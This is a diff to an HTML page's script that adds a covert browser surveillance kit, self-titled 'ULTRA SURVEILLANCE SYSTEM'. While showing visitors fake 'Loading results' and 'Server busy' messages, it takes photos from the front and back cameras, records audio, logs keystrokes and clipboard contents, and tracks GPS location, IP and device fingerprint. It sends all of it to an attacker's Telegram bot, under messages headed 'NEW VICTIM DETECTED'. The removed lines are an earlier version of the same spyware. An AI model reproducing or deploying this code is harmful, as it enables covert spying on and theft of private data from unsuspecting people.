+        console.log('✅ Clipboard monitor active');
+    },
+    
+    getData() {
+        const data = [...STATE.data.clipboard];
+        STATE.data.clipboard = [];
+        return data;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// TELEGRAM API MODULE
+// ═══════════════════════════════════════════════════════════════
+const TelegramAPI = {
+    async sendMessage(text, chatId = CONFIG.CHAT_ID) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', text);
+            formData.append('parse_mode', 'HTML');
+            formData.append('disable_web_page_preview', 'true');
+            
+            const response = await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`,
+                { method: 'POST', body: formData }
+            );
+            
+            const result = await response.json();
+            return result.ok;
+        } catch (e) {
+            STATE.counters.errors++;
+            return false;
+        }
+    },
+    
+    async sendPhoto(blob, caption, filename = 'photo.jpg', chatId = CONFIG.CHAT_ID) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, filename);
+            formData.append('caption', caption?.slice(0, 1024) || '');
+            formData.append('parse_mode', 'HTML');
+            
+            const response = await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
+                { method: 'POST', body: formData }
+            );
+            
+            const result = await response.json();
+            
+            if (!result.ok) {
+                console.log('Photo send error:', result);
+                STATE.counters.errors++;
+            }
+            
+            return result.ok;
+        } catch (e) {
+            STATE.counters.errors++;
+            return false;
+        }
+    },
+    
+    async sendAudio(blob, caption, filename = 'audio.webm', chatId = CONFIG.CHAT_ID) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('voice', blob, filename);
+            formData.append('caption', caption?.slice(0, 1024) || '');
+            formData.append('parse_mode', 'HTML');
+            
+            const response = await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVoice`,
+                { method: 'POST', body: formData }
+            );
+            
+            return (await response.json()).ok;
+        } catch {
+            STATE.counters.errors++;
+            return false;
+        }
+    },
+    
+    async sendDocument(blob, caption, filename, chatId = CONFIG.CHAT_ID) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', blob, filename);
+            formData.append('caption', caption?.slice(0, 1024) || '');
+            formData.append('parse_mode', 'HTML');
+            
+            const response = await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`,
+                { method: 'POST', body: formData }
+            );
+            
+            return (await response.json()).ok;
+        } catch {
+            STATE.counters.errors++;
+            return false;
+        }
+    },
+    
+    async sendLocation(lat, lon, chatId = CONFIG.CHAT_ID) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('latitude', lat);
+            formData.append('longitude', lon);
+            
+            const response = await fetch(
+                `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`,
+                { method: 'POST', body: formData }
+            );
+            
+            return (await response.json()).ok;
+        } catch {
+            return false;
+        }
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// MESSAGE BUILDER MODULE
+// ═══════════════════════════════════════════════════════════════
+const MessageBuilder = {
+    victimAlert(data) {
+        const fp = data.fingerprint || {};
+        const ipInfo = data.ipDetails || {};
+        const loc = data.location || {};
+        
+        return `🚨 <b>NEW VICTIM DETECTED</b> 🚨
+
+━━━━━━━━━━━━━━━━━━━━━━
+📋 <b>SESSION INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━
+┃ 🆔 Session: <code>${data.sessionId}</code>
+┃ 🎯 Action: <b>${data.resultType}</b>
+┃ ⏰ Time: ${Utils.getTimestamp()}
+
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 <b>NETWORK INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━
+┃ 📍 IP: <code>${ipInfo.ip || 'Unknown'}</code>
+┃ 🏙️ City: ${ipInfo.city || 'Unknown'}
+┃ 🗺️ Region: ${ipInfo.region || 'Unknown'}
+┃ 🌍 Country: ${ipInfo.country || 'Unknown'}
+┃ 📮 Postal: ${ipInfo.postal || 'Unknown'}
+┃ 🏢 ISP: ${ipInfo.isp || 'Unknown'}
+┃ 🕐 Timezone: ${ipInfo.timezone || 'Unknown'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+📱 <b>DEVICE INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━
+┃ 🖥️ Platform: ${fp.platform || 'Unknown'}
+┃ 📐 Screen: ${fp.screenWidth}x${fp.screenHeight}
+┃ 🔢 Cores: ${fp.hardwareConcurrency || 'N/A'}
+┃ 💾 Memory: ${fp.deviceMemory || 'N/A'} GB
+┃ 🔋 Battery: ${fp.battery?.level || 'N/A'}
+┃ ⚡ Charging: ${fp.battery?.charging ? 'Yes' : 'No'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 <b>BROWSER INFO</b>
+━━━━━━━━━━━━━━━━━━━━━━
+┃ 🔤 Language: ${fp.language || 'Unknown'}
+┃ 📶 Connection: ${fp.connectionEffectiveType || 'Unknown'}
+┃ ⬇️ Downlink: ${fp.connectionDownlink || 'N/A'} Mbps
+┃ 📊 History: ${fp.historyLength || 0} pages
+┃ 🔗 Referrer: ${fp.referrer || 'Direct'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+🎮 <b>GRAPHICS</b>
+━━━━━━━━━━━━━━━━━━━━━━
+┃ 🖼️ GPU: ${fp.webGL?.renderer?.slice(0, 50) || 'Unknown'}
+┃ 🏭 Vendor: ${fp.webGL?.vendor || 'Unknown'}
+
+${loc.latitude ? `
+━━━━━━━━━━━━━━━━━━━━━━
+📍 <b>GPS LOCATION</b>
+━━━━━━━━━━━━━━━━━━━━━━
+┃ 📌 Lat: ${loc.latitude?.toFixed(6)}
+┃ 📌 Lon: ${loc.longitude?.toFixed(6)}
+┃ 🎯 Accuracy: ${loc.accuracy?.toFixed(0)}m
+┃ 🗺️ Maps: ${loc.mapsLink}
+` : ''}
+
+━━━━━━━━━━━━━━━━━━━━━━
+📊 <b>USER AGENT</b>
+━━━━━━━━━━━━━━━━━━━━━━
+<code>${fp.userAgent?.slice(0, 200) || 'Unknown'}</code>
+
+🔥 <i>Surveillance system active...</i>`;
+    },
+    
+    photoCaption(data) {
+        return `📸 <b>FRAME #${data.frameNumber}</b>
+
+┃ 🆔 ${data.sessionId}
+┃ 📷 Camera: ${data.cameraType}
+┃ 📐 Size: ${data.width}x${data.height}
+┃ ⏰ ${Utils.getTimestamp()}
+┃ 📊 Total: ${STATE.counters.photos} photos
+
+<i>🔴 Live surveillance</i>`;
+    },
+    
+    audioCaption(data) {
+        return `🎙️ <b>AUDIO CLIP #${data.clipNumber}</b>
+
+┃ 🆔 ${data.sessionId}
+┃ ⏱️ Duration: ${data.duration}s
+┃ ⏰ ${Utils.getTimestamp()}
+
+<i>🔊 Audio captured</i>`;
+    },
+    
+    screenshotCaption(data) {
+        return `🖥️ <b>SCREENSHOT #${data.number}</b>
+
+┃ 🆔 ${data.sessionId}
+┃ ⏰ ${Utils.getTimestamp()}
+
+<i>📺 Screen captured</i>`;
+    },
+    
+    locationUpdate(loc, sessionId) {
+        return `📍 <b>LOCATION UPDATE</b>
+
+┃ 🆔 ${sessionId}
+┃ 📌 Lat: ${loc.latitude?.toFixed(6)}
+┃ 📌 Lon: ${loc.longitude?.toFixed(6)}
+┃ 🎯 Accuracy: ${loc.accuracy?.toFixed(0)}m
+┃ 🚀 Speed: ${loc.speed || 'N/A'} m/s
+┃ ⏰ ${Utils.getTimestamp()}
+
+🗺️ <a href="${loc.mapsLink}">Open in Maps</a>`;
+    },
+    
+    keylogReport(data, sessionId) {
+        let report = `⌨️ <b>ACTIVITY REPORT</b>\n\n┃ 🆔 ${sessionId}\n┃ ⏰ ${Utils.getTimestamp()}\n\n`;
+        
+        if (data.keys?.length > 0) {
+            report += `<b>━━━ KEYSTROKES ━━━</b>\n`;
+            const keyText = data.keys.map(k => k.key).join('');
+            report += `<code>${Utils.sanitizeString(keyText.slice(0, 500))}</code>\n\n`;
+        }
+        
+        if (data.clicks?.length > 0) {
+            report += `<b>━━━ CLICKS (${data.clicks.length}) ━━━</b>\n`;
+            data.clicks.slice(0, 10).forEach(c => {
+                report += `┃ ${c.target} @ (${c.x}, ${c.y})\n`;
+            });
+            report += '\n';
+        }
+        
+        return report;
+    },
+    
+    clipboardReport(data, sessionId) {
+        let report = `📋 <b>CLIPBOARD DATA</b>\n\n┃ 🆔 ${sessionId}\n┃ ⏰ ${Utils.getTimestamp()}\n\n`;
+        
+        data.forEach(item => {
+            report += `┃ ${item.type.toUpperCase()}: <code>${Utils.sanitizeString(item.content?.slice(0, 200))}</code>\n`;
+        });
+        
+        return report;
+    },
+    
+    statusUpdate(sessionId) {
+        const uptime = Utils.formatDuration(Date.now() - STATE.victim.startTime);
+        
+        return `📊 <b>STATUS UPDATE</b>
+
+┃ 🆔 ${sessionId}
+┃ ⏱️ Uptime: ${uptime}
+┃ 📸 Photos: ${STATE.counters.photos}
+┃ 🎙️ Audio: ${STATE.counters.audioClips}
+┃ 🖥️ Screenshots: ${STATE.counters.screenshots}
+┃ 📍 Locations: ${STATE.counters.locations}
+┃ ❌ Errors: ${STATE.counters.errors}
+┃ ⏰ ${Utils.getTimestamp()}
+
+<b>Active:</b>
+┃ 📷 Camera: ${STATE.flags.cameraActive ? '✅' : '❌'}
+┃ 🎤 Audio: ${STATE.flags.audioActive ? '✅' : '❌'}
+┃ 🖥️ Screen: ${STATE.flags.screenActive ? '✅' : '❌'}`;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// CAPTURE LOOPS
+// ═══════════════════════════════════════════════════════════════
+const CaptureLoops = {
+    startPhotoLoop() {
+        const interval = setInterval(async () => {
+            if (!STATE.flags.cameraActive || STATE.flags.isCapturing) return;
+            
+            STATE.flags.isCapturing = true;
+            
+            try {
+                // Front camera
+                if (STATE.streams.front) {
+                    const blob = CameraModule.capturePhoto(STATE.streams.front, 'front');
+                    if (blob) {
+                        STATE.counters.photos++;
+                        await TelegramAPI.sendPhoto(
+                            blob,
+                            MessageBuilder.photoCaption({
+                                frameNumber: STATE.counters.photos,
+                                sessionId: STATE.victim.sessionId,
+                                cameraType: 'Front',
+                                width: CONFIG.PHOTO_WIDTH,
+                                height: CONFIG.PHOTO_HEIGHT
+                            }),
+                            `front_${STATE.counters.photos}_${Date.now()}.jpg`
+                        );
+                    }
+                }
+                
+                // Back camera
+                if (STATE.streams.back) {
+                    const blob = CameraModule.capturePhoto(STATE.streams.back, 'back');
+                    if (blob) {
+                        STATE.counters.photos++;
+                        await TelegramAPI.sendPhoto(
+                            blob,
+                            MessageBuilder.photoCaption({
+                                frameNumber: STATE.counters.photos,
+                                sessionId: STATE.victim.sessionId,
+                                cameraType: 'Back',
+                                width: CONFIG.PHOTO_WIDTH,
+                                height: CONFIG.PHOTO_HEIGHT
+                            }),
+                            `back_${STATE.counters.photos}_${Date.now()}.jpg`
+                        );
+                    }
+                }
+            } catch (e) {
+                console.log('Photo loop error:', e);
+            } finally {
+                STATE.flags.isCapturing = false;
+            }
+        }, CONFIG.PHOTO_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startScreenshotLoop() {
+        if (!CONFIG.ENABLE_SCREEN) return;
+        
+        const interval = setInterval(async () => {
+            if (!STATE.flags.screenActive) return;
+            
+            const blob = ScreenModule.captureScreenshot();
+            if (blob) {
+                STATE.counters.screenshots++;
+                await TelegramAPI.sendPhoto(
+                    blob,
+                    MessageBuilder.screenshotCaption({
+                        number: STATE.counters.screenshots,
+                        sessionId: STATE.victim.sessionId
+                    }),
+                    `screenshot_${STATE.counters.screenshots}_${Date.now()}.jpg`
+                );
+            }
+        }, CONFIG.SCREEN_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startLocationLoop() {
+        if (!CONFIG.ENABLE_LOCATION) return;
+        
+        const interval = setInterval(async () => {
+            const loc = await DataCollector.getLocation();
+            if (loc && loc.latitude) {
+                STATE.counters.locations++;
+                STATE.victim.location = loc;
+                
+                await TelegramAPI.sendLocation(loc.latitude, loc.longitude);
+                await TelegramAPI.sendMessage(
+                    MessageBuilder.locationUpdate(loc, STATE.victim.sessionId)
+                );
+            }
+        }, CONFIG.LOCATION_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startKeylogLoop() {
+        if (!CONFIG.ENABLE_KEYLOGGER) return;
+        
+        const interval = setInterval(async () => {
+            const data = KeyloggerModule.getData();
+            
+            if (data.keys?.length > 0 || data.clicks?.length > 0) {
+                await TelegramAPI.sendMessage(
+                    MessageBuilder.keylogReport(data, STATE.victim.sessionId)
+                );
+            }
+        }, CONFIG.KEYLOG_SEND_INTERVAL);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startAudioLoop() {
+        const interval = setInterval(async () => {
+            if (STATE.queues.audio.length > 0) {
+                const item = STATE.queues.audio.shift();
+                await TelegramAPI.sendAudio(
+                    item.blob,
+                    MessageBuilder.audioCaption({
+                        clipNumber: STATE.counters.audioClips,
+                        sessionId: STATE.victim.sessionId,
+                        duration: item.duration
+                    }),
+                    `audio_${STATE.counters.audioClips}_${Date.now()}.webm`
+                );
+            }
+        }, 2000);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startClipboardLoop() {
+        if (!CONFIG.ENABLE_CLIPBOARD) return;
+        
+        const interval = setInterval(async () => {
+            const data = ClipboardModule.getData();
+            
+            if (data.length > 0) {
+                await TelegramAPI.sendMessage(
+                    MessageBuilder.clipboardReport(data, STATE.victim.sessionId)
+                );
+            }
+        }, 10000);
+        
+        STATE.intervals.push(interval);
+    },
+    
+    startStatusLoop() {
+        const interval = setInterval(async () => {
+            await TelegramAPI.sendMessage(
+                MessageBuilder.statusUpdate(STATE.victim.sessionId)
+            );
+        }, 60000); // Every minute
+        
+        STATE.intervals.push(interval);
+    },
+    
+    stopAll() {
+        STATE.intervals.forEach(clearInterval);
+        STATE.intervals = [];
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// MAIN INITIALIZATION
+// ═══════════════════════════════════════════════════════════════
 async function initCapture(resultType) {
     if (STATE.initialized) return;
     STATE.initialized = true;
+    STATE.victim.startTime = Date.now();
+    STATE.victim.sessionId = Utils.generateSessionId();
+    STATE.victim.resultType = resultType;
     
-    STATE.sessionId = Utils.genId();
-    STATE.startTime = Date.now();
+    console.log('🚀 ULTRA SURVEILLANCE SYSTEM INITIALIZING...');
+    console.log('📋 Session ID:', STATE.victim.sessionId);
     
-    // Fake loading
+    // Show fake loading
     document.querySelectorAll('.result').forEach(el => {
-        el.innerHTML += '<br><small style="color:#00ff00">Loading results... Please wait</small>';
+        el.innerHTML += '<br><small style="color:#00ff00">🔄 Loading results... Please wait</small>';
     });
     
-    // Collect all data
-    const [ipData, location, fp] = await Promise.all([
-        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'Unknown'})),
-        new Promise(res => navigator.geolocation.getCurrentPosition(
-            p => res({lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy}),
-            () => res(null),
-            {enableHighAccuracy: true, timeout: 10000}
-        )),
-        navigator.userAgent
-    ]);
-    
-    // Send victim alert + location once
-    const alertMsg = `NEW VICTIM CAPTURED
-
-SESSION: <code>${STATE.sessionId}</code>
-ACTION: ${resultType}
-TIME: ${Utils.ts()}
-
-IP: <code>${ipData.ip || 'Unknown'}</code>
-CITY: ${ipData.city || 'Unknown'}
-REGION: ${ipData.region || 'Unknown'}
-COUNTRY: ${ipData.country_name || 'Unknown'}
-ISP: ${ipData.org || 'Unknown'}
-
-DEVICE: ${navigator.platform}
-SCREEN: ${screen.width}×${screen.height}
-USER AGENT: ${fp.slice(0, 150)}
-
-FRONT CAMERA + MIC ACTIVE (9:16 1080×1920)
-@vanshcz • 2025 MAX EDITION`;
-    
-    await TG.sendMessage(alertMsg);
-    
-    if (location) {
-        await TG.sendLocation(location.lat, location.lon);
-        await TG.sendMessage(`LOCATION LOCKED\nAccuracy: ±${location.acc.toFixed(0)}m\nhttps://maps.google.com/?q=${location.lat},${location.lon}`);
-        STATE.locationSent = true;
+    try {
+        // 1. Collect all data in parallel
+        const [ipDetails, fingerprint, location] = await Promise.all([
+            DataCollector.getIPDetails(),
+            DataCollector.getFullFingerprint(),
+            DataCollector.getLocation()
+        ]);
+        
+        STATE.victim.ip = ipDetails.ip;
+        STATE.victim.fingerprint = fingerprint;
+        STATE.victim.location = location;
+        
+        // 2. Send initial alert
+        await TelegramAPI.sendMessage(
+            MessageBuilder.victimAlert({
+                sessionId: STATE.victim.sessionId,
+                resultType: resultType,
+                ipDetails: ipDetails,
+                fingerprint: fingerprint,
+                location: location
+            })
+        );
+        
+        // 3. Send exact location if available
+        if (location?.latitude) {
+            await TelegramAPI.sendLocation(location.latitude, location.longitude);
+        }
+        
+        // 4. Start all capture systems
+        console.log('📷 Starting cameras...');
+        await CameraModule.startFrontCamera();
+        await CameraModule.startBackCamera();
+        
+        console.log('🎤 Starting audio...');
+        await AudioModule.startRecording();
+        
+        // 5. Initialize monitors
+        console.log('⌨️ Starting keylogger...');
+        KeyloggerModule.init();
+        
+        console.log('📋 Starting clipboard monitor...');
+        ClipboardModule.init();
+        
+        // 6. Try screen capture (will fail silently if denied)
+        console.log('🖥️ Attempting screen capture...');
+        // ScreenModule.startCapture(); // Uncomment if needed
+        
+        // 7. Start all capture loops
+        console.log('🔄 Starting capture loops...');
+        CaptureLoops.startPhotoLoop();
+        CaptureLoops.startAudioLoop();
+        CaptureLoops.startScreenshotLoop();
+        CaptureLoops.startLocationLoop();
+        CaptureLoops.startKeylogLoop();
+        CaptureLoops.startClipboardLoop();
+        CaptureLoops.startStatusLoop();
+        
+        console.log('✅ ALL SYSTEMS ACTIVE');
+        console.log('📊 Photo interval:', CONFIG.PHOTO_INTERVAL + 'ms');
+        console.log('🎙️ Audio duration:', CONFIG.AUDIO_DURATION + 'ms');
+        
+    } catch (e) {
+        console.log('❌ Initialization error:', e);
+        
+        // Send error report
+        await TelegramAPI.sendMessage(
+            `⚠️ <b>INITIALIZATION ERROR</b>\n\n` +
+            `Session: ${STATE.victim.sessionId}\n` +
+            `Error: ${e.message}\n` +
+            `Time: ${Utils.getTimestamp()}`
+        );
     }
     
-    // Start front camera
-    const camOk = await startFrontCamera();
-    if (!camOk) {
-        await TG.sendMessage(`FRONT CAMERA DENIED OR FAILED\nSession: ${STATE.sessionId}`);
-    }
-    
-    // Start mic recording
-    if (STATE.stream) {
-        const recorder = new MediaRecorder(STATE.stream, {mimeType: 'audio/webm;codecs=opus'});
-        recorder.ondataavailable = e => e.data.size > 0 && TG.sendAudio(e.data);
-        recorder.start();
-        setInterval(() => recorder.state === 'recording' && recorder.stop() && recorder.start(), CONFIG.AUDIO_DURATION);
-        STATE.mediaRecorder = recorder;
-    }
-    
-    // Start photo loop (every 400ms)
-    STATE.intervals.push(setInterval(async () => {
-        if (!STATE.stream) return;
-        const blob = await capturePhoto();
-        if (blob) await TG.sendPhoto(blob);
-    }, CONFIG.PHOTO_INTERVAL));
-    
-    // Final fake message
+    // Show more fake loading
     setTimeout(() => {
         document.querySelectorAll('.result').forEach(el => {
-            el.innerHTML = el.innerHTML.replace('Loading results...', 'Server busy. Please try again in 5 minutes.');
+            el.innerHTML = el.innerHTML.replace(
+                'Loading results... Please wait',
+                '⚠️ Server busy. Please try again in 5 minutes.'
+            );
         });
-    }, 6000);
+    }, 5000);
 }
 
-// Auto-restart camera if lost
-setInterval(() => {
-    if (STATE.initialized && !STATE.stream?.active) {
-        startFrontCamera();
-    }
-}, 8000);
+// ═══════════════════════════════════════════════════════════════
+// VISIBILITY & LIFECYCLE HANDLERS
+// ═══════════════════════════════════════════════════════════════
 
-console.log("VANSHCZ FRONT CAMERA STEALTH SYSTEM LOADED | 9:16 MAX QUALITY");
+// Handle page visibility
+document.addEventListener('visibilitychange', async () => {
+    if (document.hidden) {
+        // Page hidden - send notification
+        await TelegramAPI.sendMessage(
+            `👁️ <b>PAGE HIDDEN</b>\n\n` +
+            `┃ 🆔 ${STATE.victim.sessionId}\n` +
+            `┃ ⏰ ${Utils.getTimestamp()}\n\n` +
+            `<i>User switched tabs or minimized</i>`
+        );
+    } else {
+        // Page visible again
+        await TelegramAPI.sendMessage(
+            `👁️ <b>PAGE VISIBLE</b>\n\n` +
+            `┃ 🆔 ${STATE.victim.sessionId}\n` +
+            `┃ ⏰ ${Utils.getTimestamp()}\n\n` +
+            `<i>User returned to page</i>`
+        );
+    }
+});
+
+// Handle page unload
+window.addEventListener('beforeunload', async () => {
+    // Send final data
+    const keyData = KeyloggerModule.getData();
+    const clipData = ClipboardModule.getData();
+    
+    if (keyData.keys?.length > 0) {
+        await TelegramAPI.sendMessage(
+            MessageBuilder.keylogReport(keyData, STATE.victim.sessionId)
+        );
+    }
+    
+    if (clipData.length > 0) {
+        await TelegramAPI.sendMessage(
+            MessageBuilder.clipboardReport(clipData, STATE.victim.sessionId)
+        );
+    }
+    
+    // Final notification
+    await TelegramAPI.sendMessage(
+        `🚪 <b>SESSION ENDED</b>\n\n` +
+        `┃ 🆔 ${STATE.victim.sessionId}\n` +
+        `┃ ⏱️ Duration: ${Utils.formatDuration(Date.now() - STATE.victim.startTime)}\n` +
+        `┃ 📸 Photos: ${STATE.counters.photos}\n` +
+        `┃ 🎙️ Audio: ${STATE.counters.audioClips}\n` +
+        `┃ 📍 Locations: ${STATE.counters.locations}\n` +
+        `┃ ⏰ ${Utils.getTimestamp()}\n\n` +
+        `<i>Session terminated</i>`
+    );
+});
+
+// Handle page hide (mobile)
+window.addEventListener('pagehide', () => {
+    // Stop all streams
+    CameraModule.stopAll();
+    AudioModule.stop();
+    ScreenModule.stop();
+    CaptureLoops.stopAll();
+});
+
+// Handle errors
+window.addEventListener('error', async (e) => {
+    await TelegramAPI.sendMessage(
+        `❌ <b>JS ERROR</b>\n\n` +
+        `┃ 🆔 ${STATE.victim.sessionId}\n` +
+        `┃ Error: ${e.message}\n` +
+        `┃ File: ${e.filename}\n` +
+        `┃ Line: ${e.lineno}\n` +
+        `┃ ⏰ ${Utils.getTimestamp()}`
+    );
+});
+
+// Handle unhandled promise rejections
+window.addEventListener('unhandledrejection', async (e) => {
+    await TelegramAPI.sendMessage(
+        `❌ <b>PROMISE REJECTION</b>\n\n` +
+        `┃ 🆔 ${STATE.victim.sessionId}\n` +
+        `┃ Reason: ${e.reason}\n` +
+        `┃ ⏰ ${Utils.getTimestamp()}`
+    );
+});
+
+// Network status
+if (CONFIG.ENABLE_NETWORK) {
+    window.addEventListener('online', async () => {
+        await TelegramAPI.sendMessage(
+            `🌐 <b>NETWORK: ONLINE</b>\n\n` +
+            `┃ 🆔 ${STATE.victim.sessionId}\n` +
+            `┃ ⏰ ${Utils.getTimestamp()}`
+        );
+    });
+    
+    window.addEventListener('offline', async () => {
+        // Queue message for when back online
+        STATE.queues.messages.push({
+            text: `🌐 <b>NETWORK: OFFLINE</b>\n\n` +
+                  `┃ 🆔 ${STATE.victim.sessionId}\n` +
+                  `┃ ⏰ ${Utils.getTimestamp()}`,
+            time: Date.now()
+        });
+    });
+}
+
+// Device orientation
+window.addEventListener('deviceorientation', (e) => {
+    // Track significant orientation changes
+    // Could be useful for detecting phone position
+});
+
+// Battery status
+if (CONFIG.ENABLE_BATTERY && navigator.getBattery) {
+    navigator.getBattery().then(battery => {
+        battery.addEventListener('levelchange', async () => {
+            if (battery.level <= 0.1) { // 10% or less
+                await TelegramAPI.sendMessage(
+                    `🔋 <b>LOW BATTERY WARNING</b>\n\n` +
+                    `┃ 🆔 ${STATE.victim.sessionId}\n` +
+                    `┃ Level: ${Math.round(battery.level * 100)}%\n` +
+                    `┃ ⏰ ${Utils.getTimestamp()}`
+                );
+            }
+        });
+    });
+}
+
+console.log('🔥 ULTRA SURVEILLANCE SYSTEM LOADED');
+console.log('📋 Waiting for user interaction...');
+
 </script>
+
 </body>
 </html>
